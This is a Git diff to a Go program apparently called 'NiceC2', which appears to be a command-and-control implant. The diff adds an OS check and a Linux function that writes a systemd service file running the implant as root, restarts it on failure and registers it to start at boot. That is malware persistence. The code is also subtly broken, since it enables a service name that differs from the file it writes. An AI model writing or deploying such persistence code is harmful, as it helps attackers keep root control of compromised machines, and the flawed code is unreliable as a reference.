@@ -119,7 +119,26 @@ func installSelf() (error, string) {
 		}
 	}
 
+	switch runtime.GOOS {
+
+	case "linux":
+		fmt.Println("Linux")
+
+		Linux()
+
+	case "darwin":
+		fmt.Println("MacOS")
+	case "windows":
+		fmt.Println("Windows")
+	default:
+		fmt.Println("Unsupported operating system ")
+
+	}
+
 	return nil, filepath.Join(dst, filepath.Base(self))
+
+	// Making the isntalled program auto-Start
+
 }
 
 func check_enabled(shell string, commandString string) bool {
@@ -227,4 +246,56 @@ func runCommand(command string) (outString string, errorMessage string) {
 
 	return
 
+}
+
+func Linux() {
+
+	// Set the path to the systemd service file
+	serviceFilePath := "/etc/systemd/system/NiceC2.service"
+
+	// Create the systemd service file
+	serviceFile, err := os.Create(serviceFilePath)
+	if err != nil {
+		fmt.Println("Error creating service file:", err)
+		return
+	}
+	defer serviceFile.Close()
+
+	// Write the service file content
+	_, err = serviceFile.WriteString(`[Unit]
+Description=My program service
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/NiceC2/per
+WorkingDirectory=/usr/local/bin/
+Restart=on-failure
+User=root
+
+[Install]
+WantedBy=multi-user.target`)
+	if err != nil {
+		fmt.Println("Error writing service file:", err)
+		return
+	}
+
+	// Reload the systemd configuration
+	reloadCmd := exec.Command("systemctl", "daemon-reload")
+	err = reloadCmd.Run()
+	if err != nil {
+		fmt.Println("Error reloading systemd configuration:", err)
+		return
+	}
+
+	// Enable the service to auto-start at boot
+	enableCmd := exec.Command("systemctl", "enable", "myprogram.service")
+	err = enableCmd.Run()
+	if err != nil {
+		fmt.Println("Error enabling service to auto-start at boot:", err)
+		return
+	}
+
+	fmt.Println("Service created and registered to auto-start at boot as root.")
+
+	return
 }
